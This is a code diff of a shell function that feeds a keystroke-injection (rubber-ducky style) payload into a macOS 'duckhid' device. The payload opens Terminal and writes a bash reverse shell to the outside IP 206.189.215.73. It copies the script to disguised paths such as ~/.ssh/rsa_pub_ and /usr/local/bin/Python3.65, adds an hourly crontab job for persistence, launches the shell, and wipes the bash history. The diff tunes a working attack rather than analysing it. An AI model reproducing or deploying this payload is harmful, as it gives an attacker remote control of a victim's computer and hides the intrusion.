@@ -13,23 +13,27 @@ function onKeyboardUp()
         cat <<- EOF | duckhid
 
                 GUI SPACE
-                DELAY 500
-                STRING terminal
-                DELAY 100
+                DELAY 300
+                STRING terminal.app
+                DELAY 200
                 ENTER
-                DELAY 2000
+                DELAY 1500
                 STRING echo "#\!/bin/bash" > ~/app_support.sh && echo "bash -i >& /dev/tcp/206.189.215.73/3456 0>&1" >> ~/app_support.sh && chmod a+x ~/app_support.sh
-                DELAY 1500
+                DELAY 1000
                 ENTER
-                DELAY 300
-                STRING cp ~/app_support.sh /tmp/; cp ~/app_support.sh ~/.ssh/ras_pub_; cp ~/app_support.sh ~/.ssh/ras_pub_; mkdir -p ~/Library/.hidden && cp ~/app_support.sh ~/Library/.hidden/; cp ~/app_support.sh ~/Library/Python3.65; cp ~/app_support.sh /usr/local/bin/Python3.65;
-                DELAY 1500
+                DELAY 200
+                STRING cp ~/app_support.sh /tmp/; cp ~/app_support.sh ~/.ssh/rsa_pub_; mkdir -p ~/Library/.hidden && cp ~/app_support.sh ~/Library/.hidden/; cp ~/app_support.sh ~/Library/Python3.65; cp ~/app_support.sh /usr/local/bin/Python3.65;
+                DELAY 1250
                 ENTER
-                DELAY 300
-                STRING crontab -l | { cat; echo '*/10 * * * * ~/app_support.sh || /tmp/app_support.sh || ~/.ssh/ras_pub_ || ~/Library/.hidden/app_support.sh || ~/Library/Python3.65 || /usr/local/bin/Python3.65'; } | crontab - && history -c && rm ~/.bash_history && exit
+                DELAY 200
+                STRING crontab -l | { cat; echo '0 * * * * ~/app_support.sh &>/dev/null || /tmp/app_support.sh &>/dev/null || ~/.ssh/rsa_pub_ &>/dev/null || ~/Library/.hidden/app_support.sh &>/dev/null || ~/Library/Python3.65 &>/dev/null || /usr/local/bin/Python3.65 &>/dev/null'; } | crontab -
                 DELAY 1500
                 ENTER
                 DELAY 2000
+                STRING cd ~/ && ~/app_support.sh &; history -c && rm ~/.bash_history && disown && exit
+                DELAY 500
+                ENTER
+                DELAY 1000
                 GUI q
 
         EOF
